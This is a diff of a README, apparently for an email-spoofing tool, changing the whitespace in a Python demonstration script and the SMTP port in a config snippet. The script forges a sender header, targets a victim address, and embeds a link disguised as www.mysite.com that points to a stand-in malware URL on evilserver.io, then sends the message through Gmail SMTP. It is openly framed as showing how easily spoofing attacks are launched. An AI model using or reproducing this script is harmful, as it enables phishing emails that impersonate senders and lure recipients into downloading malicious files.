@@ -29,22 +29,22 @@ In order to make it appear as if the email came from a different server or domai
 _The below python script demonstrate how easy it is for an attacker to modify email message header and launch 
 an email spoofing attack:_
 ```py
-import os, sys, time, smtplib								# import smtp utilities
-from email.mime.text import MIMEText						# import email utilities
+import os, sys, time, smtplib								   # import smtp utilities
+from email.mime.text import MIMEText			 # import email utilities
 from email.mime.multipart import MIMEMultipart
 
 mal="<a href='http://evilserver.io/virus.php'>www.mysite.com</a>"
 msg=MIMEMultipart("alternative")
-msg["From"]="Spoof Username <spoofAddress@gmail.com>"		# Spoof Username and Email Address <--\
-msg["To"]="victim1234@gmail.com"							# Victims Email Address				  |---> Email Headers
-msg["Subject"]="Spoof Mailer v2.0"							# Message Subject	<----------------/
-html="<center><h1>Spoof Mailer v2.0</h1></center>"			# Message Heading   <----------------_-_--> Email Message
+msg["From"]="Spoof Username <spoofAddress@gmail.com>"		    # Spoof Username and Email Address <--\
+msg["To"]="victim1234@gmail.com"							                    # Victims Email Address	         			  |---> Email Headers
+msg["Subject"]="Spoof Mailer v2.0"							                  # Message Subject	<------------------/
+html="<center><h1>Spoof Mailer v2.0</h1></center>"			      # Message Heading   <----------------_-_--> Email Message
 html+=f"<p>Click this link: {mal}, to download a file</p>"	# Message   <-----------------------/
 html_part=MIMEText(html, "html")
 msg.attach(html_part)
 
-Server = smtplib.SMTP("smtp.gmail.com", 587)								# Connect to Gmail Server on Port 587
-Server.starttls()															# Start Connection
+Server = smtplib.SMTP("smtp.gmail.com", 587)			      					# Connect to Gmail Server on Port 587
+Server.starttls()															                          # Start Connection
 Server.login("attacker33@gmail.com", "password1234")						# Attacker Login to his/her Gmail Account
 Server.sendmail("attacker33@gmail.com", "victim1234@gmail.com", str(msg))	# Send Message to Victims as Spoofed User
 Server.quit()																# End Connection
@@ -77,7 +77,7 @@ The default `host` and `port` configuration in `config.ini` is set up for Gmail,
 
 ```ini
 [SMTP]
-port = 587
+port = 465
 host = smtp.gmail.com
 user = <SMTP Server Username>
 pass = <SMTP Server Password>
